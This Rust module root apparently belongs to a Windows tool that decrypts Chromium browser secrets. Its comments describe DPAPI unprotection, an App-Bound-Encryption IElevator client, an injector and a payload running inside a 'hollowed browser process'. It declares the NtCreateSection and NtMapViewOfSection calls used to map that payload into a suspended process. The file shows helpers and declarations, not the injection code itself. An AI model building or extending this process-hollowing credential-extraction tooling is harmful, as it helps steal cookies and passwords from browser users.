//! Windows-only machinery. Every `unsafe` block in the crate lives under this
//! module tree.
//!
//! - [`dpapi`] — `CryptUnprotectData` behind a safe API.
//! - [`elevator`] — the Chromium App-Bound-Encryption `IElevator` COM client.
//! - [`image`] — PE32+ header parsing (pure byte math, no OS calls).
//! - [`postbox`] — the fixed-address mailbox page shared by the two halves.
//! - [`conduit`] — the named-pipe channel + authenticated frame protocol.
//! - [`proc`] — process/memory primitives (spawn, map, resume, sample).
//! - [`injector`] — the parent-side orchestration of the in-browser run.
//! - [`proxy`] — the payload-side run inside the hollowed browser process.
#![allow(unsafe_code)]

pub mod conduit;
pub mod dpapi;
pub mod elevator;
pub mod image;
pub mod injector;
pub mod postbox;
pub mod proc;
pub mod proxy;

use std::ffi::c_void;

use windows_sys::Win32::Foundation::{GetLastError, HANDLE};

/// An owned Win32 handle closed exactly once on drop.
pub(crate) struct OwnedHandle {
    raw: HANDLE,
}

impl OwnedHandle {
    #[must_use]
    pub(crate) fn new(raw: HANDLE) -> Self {
        Self { raw }
    }

    #[must_use]
    pub(crate) fn raw(&self) -> HANDLE {
        self.raw
    }
}

impl Drop for OwnedHandle {
    fn drop(&mut self) {
        if !self.raw.is_null() && self.raw != -1isize as HANDLE {
            // SAFETY: `raw` is a live handle this value owns, closed once.
            unsafe { windows_sys::Win32::Foundation::CloseHandle(self.raw) };
        }
    }
}

/// UTF-16 NUL-terminated string for Win32 APIs.
#[must_use]
pub(crate) fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// A Win32 error with the failing API name.
#[derive(Debug)]
pub(crate) struct WinError {
    pub(crate) operation: &'static str,
    pub(crate) code: u32,
}

impl std::fmt::Display for WinError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{} failed (win32 error {})", self.operation, self.code)
    }
}

impl std::error::Error for WinError {}

/// Error from the last Win32 call, tagged with the API name.
pub(crate) fn last_error(operation: &'static str) -> anyhow::Error {
    // SAFETY: callable after any failed Win32 API; returns the thread's last
    // error code, which the caller captured immediately.
    let code = unsafe { GetLastError() };
    anyhow::Error::new(WinError { operation, code })
}

/// An NTSTATUS-flavored error from an `Nt*` call.
pub(crate) fn nt_error(operation: &'static str, status: i32) -> anyhow::Error {
    anyhow::anyhow!("{operation} failed (NTSTATUS 0x{status:08x})")
}

// ntdll primitives not surfaced by windows-sys with the features we use.
#[link(name = "ntdll")]
extern "system" {
    /// `NtCreateSection` — needed for the `SEC_IMAGE` section backing the
    /// payload mapping (a genuine image view the OS loader accepts).
    pub(crate) fn NtCreateSection(
        section_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *const c_void,
        maximum_size: *const i64,
        section_page_protection: u32,
        allocation_attributes: u32,
        file_handle: HANDLE,
    ) -> i32;

    /// `NtMapViewOfSection` — maps the image section into the suspended child.
    #[allow(clippy::too_many_arguments)]
    pub(crate) fn NtMapViewOfSection(
        section_handle: HANDLE,
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        commit_size: usize,
        section_offset: *const i64,
        view_size: *mut usize,
        inherit_disposition: u32,
        allocation_type: u32,
        win32_protection: u32,
    ) -> i32;
}

/// `SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE`.
pub(crate) const SECTION_MAP_ALL: u32 = 0x000E;
/// `SEC_IMAGE` — the mapping is an executable image view.
pub(crate) const SEC_IMAGE: u32 = 0x1000_0000;
/// `ViewShare` inherit disposition.
pub(crate) const VIEW_SHARE: u32 = 1;
